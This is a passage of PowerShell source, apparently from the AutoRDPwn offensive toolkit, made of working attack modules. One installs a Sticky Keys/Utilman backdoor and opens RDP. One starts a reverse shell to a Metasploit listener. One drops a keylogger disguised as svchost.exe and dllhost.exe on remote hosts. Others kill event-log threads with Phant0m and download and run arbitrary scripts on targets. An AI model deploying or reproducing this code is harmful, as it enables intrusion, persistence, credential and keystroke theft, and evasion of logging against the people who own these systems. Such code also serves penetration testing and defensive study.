    Write-ARInfo (Get-ARText 'txt34' 'Modifying permissions to enter without credentials..')
    Invoke-ARTargetCommand -ScriptBlock {
        $keys = @('sethc.exe', 'Utilman.exe')
        foreach ($key in $keys) {
            $path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\' + $key
            New-Item -Path $path -Force | Out-Null
            New-ItemProperty -Path $path -Name 'Debugger' -Value 'powershell.exe -noexit ; clear' -PropertyType String -Force | Out-Null
        }
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name 'LogonTimeout' -Value 3600 -PropertyType DWORD -Force | Out-Null
        Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' -ErrorAction SilentlyContinue
        Enable-NetFirewallRule -Name 'RemoteDesktop-UserMode-In-TCP' -ErrorAction SilentlyContinue
    } | Out-Null
    Write-ARSuccess 'Sticky Keys backdoor installed. Trigger it from the logon screen.'
    Set-ARStatus 'Sticky Keys backdoor installed' 'Ok'
}

function Invoke-ARModuleMetasploit {
    $msfHost = Read-ARValue (Get-ARText 'txt65' 'Enter the IP where MSF is running')
    $msfPort = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port') '4444'
    $template = @'
$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()
'@
    $payload = $template -f $msfHost, $msfPort
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock { param($code) Invoke-Expression $code } -ArgumentList $payload | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        Invoke-Command -Session $session -ArgumentList $payload -ScriptBlock {
            param($code)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock { param($command) Invoke-Expression $command } -ArgumentList $code | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    Write-ARWarn (Get-ARText 'txt63' 'Paste in your Metasploit Framework Console:')
    Write-Host 'use exploit/multi/handler'
    Write-Host 'set payload windows/shell/reverse_tcp'
    Write-Host ('set LHOST ' + $msfHost)
    Write-Host ('set LPORT ' + $msfPort)
    Write-Host 'exploit'
    Set-ARStatus 'Metasploit payload started' 'Ok'
}

function Invoke-ARModuleKeylogger {
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-Keylogger.ps1'
    Push-Location $script:ARTools
    try { . $scriptPath; $first = $Content1; $second = $Content2 } finally { Pop-Location }
    if (-not $first -or -not $second) { throw 'The keylogger payload could not be loaded.' }
    $work = New-ARWorkDirectory
    $localDll = Join-Path $work 'dllhost.exe'
    $localHost = Join-Path $work 'svchost.exe'
    [System.IO.File]::WriteAllBytes($localDll, $first)
    [System.IO.File]::WriteAllBytes($localHost, $second)
    if (Test-ARIsLocalTarget) {
        $dll = $localDll
        $hostProcess = $localHost
        Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
        $logPath = Join-Path $env:LOCALAPPDATA 'config.dat'
        Remove-Item -LiteralPath $logPath -Force -ErrorAction SilentlyContinue
        Push-Location $work
        try { & $dll nomsg explorer.exe $hostProcess | Out-Null } finally { Pop-Location }
        Start-Sleep -Milliseconds 500
        if (-not (Test-Path -LiteralPath $logPath)) { New-Item -ItemType File -Path $logPath -Force | Out-Null }
        if (-not $script:ARModuleFiles.Contains($logPath)) { $script:ARModuleFiles.Add($logPath) }
        Write-ARInfo 'Remote Keylogger | Press Ctrl+C to stop'
        try { Get-Content -LiteralPath $logPath -Wait } finally { Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue }
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnKey_' + [guid]::NewGuid().ToString('N')
        $remoteDll = Join-Path $remoteDirectory 'dllhost.exe'
        $remoteHost = Join-Path $remoteDirectory 'svchost.exe'
        Copy-ARFileToTarget -LocalPath $localDll -RemotePath $remoteDll | Out-Null
        Copy-ARFileToTarget -LocalPath $localHost -RemotePath $remoteHost | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        $logPath = Invoke-Command -Session $session -ArgumentList $remoteDll, $remoteHost -ScriptBlock {
            param($dll, $hostProcess)
            Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
            $log = Join-Path $env:LOCALAPPDATA 'config.dat'
            Remove-Item -LiteralPath $log -Force -ErrorAction SilentlyContinue
            Push-Location (Split-Path -Parent $dll)
            try { & $dll nomsg explorer.exe $hostProcess | Out-Null } finally { Pop-Location }
            Start-Sleep -Milliseconds 500
            if (-not (Test-Path -LiteralPath $log)) { New-Item -ItemType File -Path $log -Force | Out-Null }
            return $log
        } -ErrorAction Stop
        if (-not $script:ARModuleFiles.Contains([string]$logPath)) { $script:ARModuleFiles.Add([string]$logPath) }
        Write-ARInfo 'Remote Keylogger | Press Ctrl+C to stop'
        try {
            Invoke-Command -Session $session -ArgumentList $logPath -ScriptBlock {
                param($path)
                Get-Content -LiteralPath $path -Wait
            } | ForEach-Object { Write-Host $_ }
        }
        finally {
            try {
                Invoke-Command -Session $session -ArgumentList $remoteHost -ScriptBlock {
                    param($hostProcess)
                    Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
                } -ErrorAction SilentlyContinue | Out-Null
            } catch { }
        }
    }
    Set-ARStatus 'Keylogger stopped' 'Ok'
}

function Invoke-ARModuleChachi {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Chachi-Enumerator.ps1' -Function 'Comprueba-Todo'
    Show-ARText $result
    Set-ARStatus 'Enumeration finished' 'Ok'
}

function Invoke-ARModuleSherlock {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Sherlock.ps1' -Function 'Find-AllVulns'
    Show-ARText $result
    Set-ARStatus 'Sherlock finished' 'Ok'
}

function Invoke-ARModulePrivescCheck {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-PrivescCheck.ps1' -Function 'Invoke-PrivescCheck'
    Show-ARText $result
    Set-ARStatus 'Privilege escalation audit finished' 'Ok'
}

function Invoke-ARModulePhant0m {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-Phant0m.ps1' -Function 'Invoke-Phant0m'
    Show-ARText $result
    Set-ARStatus 'Event log threads stopped' 'Ok'
}

# Screen access runs over the target-side JPEG frame server and its pull viewer.
# The old route staged a 1.7 MB VNC vendor blob and injected it reflectively;
# that injection dies silently after the GetProcAddress fix, so it is retired.
function Invoke-ARModuleVncServer {
    Invoke-ARAttackQuickScreen
}

function Invoke-ARModuleExternalScript {
    $source = Read-ARValue (Get-ARText 'txt73' 'Enter the path or url of the script')
    $function = Read-ARLineValue (' ' + (Get-ARText 'txt74' 'Write the function you want to execute') + ' [none]: ')
    if ($null -eq $function) { $function = '' } else { $function = $function.Trim() }
    if ($source -match '^https?://') {
        $work = New-ARWorkDirectory
        $localScript = Join-Path $work 'external.ps1'
        Invoke-ARDownload -Url $source -OutFile $localScript
    }
    elseif (Test-Path -LiteralPath $source) {
        $localScript = (Resolve-Path -LiteralPath $source).Path
    }
    else { throw 'The external script could not be found.' }
    if (Test-ARIsLocalTarget) {
        $result = & {
            param($path, $functionName)
            . $path
            if ($functionName -ne '') { Invoke-Expression $functionName }
        } $localScript $function
        Show-ARText $result
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnScript_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'external.ps1'
        Copy-ARFileToTarget -LocalPath $localScript -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        $result = Invoke-Command -Session $session -ArgumentList $remoteScript, $function -ScriptBlock {
            param($path, $functionName)
            Push-Location (Split-Path -Parent $path)
            try {
                . $path
                if ($functionName -ne '') { Invoke-Expression $functionName }
            }
            finally { Pop-Location }
        } -ErrorAction Stop
        Show-ARText $result
    }
    Set-ARStatus 'External script executed' 'Ok'
}

function Invoke-ARModuleRunAs {
    if (-not (Test-ARIsLocalTarget)) { throw 'RunAs only works on the local computer.' }
    $user = Read-ARValue (Get-ARText 'txt78' 'Enter the username')
    $plain = Read-ARSecret 'Password'
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    $context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine', $env:COMPUTERNAME)
    if (-not $context.ValidateCredentials($user, $plain)) {
        throw (Get-ARText 'txt81' 'Wrong credentials! Returning to the main menu..')
    }
    Import-ARToolScript 'Resources\Scripts\Invoke-RunAs.ps1'
    $executable = Join-Path $script:ARTools 'RunAs.exe'
    if (-not (Test-Path -LiteralPath $executable)) { throw 'RunAs could not be extracted.' }
    & $executable -u $user -p $plain -e 'powershell.exe -NoExit'
    Set-ARStatus 'Process launched as the new user' 'Ok'
}

function Show-ARLineLanguagePicker {
    $languages = @('English', 'Spanish', 'French', 'German', 'Italian', 'Russian', 'Portuguese')
    Write-Host ''
    for ($index = 0; $index -lt $languages.Count; $index++) {
        Write-Host (' {0}. {1}' -f ($index + 1), $languages[$index]) -ForegroundColor Gray
    }
    $defaultIndex = [Array]::IndexOf($languages, $script:ARLocaleName)
    if ($defaultIndex -lt 0) { $defaultIndex = 0 }
    $choice = Read-ARValue 'Language (1-7)' ([string]($defaultIndex + 1))
    $name = Resolve-ARLanguageName $choice
    Initialize-ARLanguage $name
    Set-ARStatus ('Language: ' + $name) 'Ok'
}

function Start-ARApplication {
    if (Get-Command Get-ARLastLanguage -ErrorAction SilentlyContinue) {
        try { $savedLanguage = Get-ARLastLanguage } catch { $savedLanguage = '' }
        if ($savedLanguage -and -not $script:ARLanguageArgument) { $script:ARLanguageArgument = $savedLanguage }
    }
    Initialize-ARLanguage $script:ARLanguageArgument
    $null = Restore-ARLastProfile
    if ($script:ARShadowPreference -in @('see', 'view', 'ver', 'regarder', 'siehe', 'vedere')) {
        $script:ARTarget['Mode'] = 'view'
    }
    elseif ($script:ARShadowPreference -in @('control', 'controlar', 'controle', 'kontrolle', 'controllo')) {
        $script:ARTarget['Mode'] = 'control'
    }
    Initialize-ARDefender
    Set-ARStatus 'Ready' 'Info'

    if ($script:ARInvokedFromOption) {
        $selection = Resolve-ARSelection $script:AROptionValue
        if ($selection -like 'ACTION:*') {
            $script:ARLastFailure = ''
            Invoke-ARAction $selection.Substring(7)
            if ($script:ARLastFailure) { exit 1 }
            return
        }
        Write-ARError ('Unknown option: ' + $script:AROptionValue)
        exit 1
    }

    while ($true) {
        if ($script:ARNoGui -or [Console]::IsInputRedirected) {
            $selection = Show-ARLineMenu
            if ([string]::IsNullOrWhiteSpace($selection) -or $selection -eq 'QUIT') { break }
            if ($selection -eq 'TARGET') { Show-ARLineTargetForm; continue }
            if ($selection -eq 'PROFILES') { $null = Show-ARLineTargetPicker; continue }
            if ($selection -eq 'SAVE') { $null = Save-ARCurrentTarget; continue }
            if ($selection -eq 'LANGUAGE') { Show-ARLineLanguagePicker; continue }
            if ($selection -like 'ACTION:*') { Invoke-ARAction $selection.Substring(7); continue }
            Set-ARStatus (Get-ARText 'txt6' 'Incorrect option, try again') 'Warn'
            continue
        }
        $selection = Show-ARTui
        if ([string]::IsNullOrWhiteSpace($selection) -or $selection -eq 'QUIT') { break }
        if ($selection -eq 'TARGET') { continue }
        if ($selection -eq 'LANGUAGE') {
            $language = Show-ARLanguagePicker
            if ($language -ne '') { Initialize-ARLanguage $language }
            continue
        }
        if ($selection -like 'ACTION:*') { Invoke-ARAction $selection.Substring(7); continue }
    }
}

try {
    Start-ARApplication
}
catch {
    Write-ARError $_.Exception.Message
    exit 1
}
finally {
    Invoke-ARCleanup
}
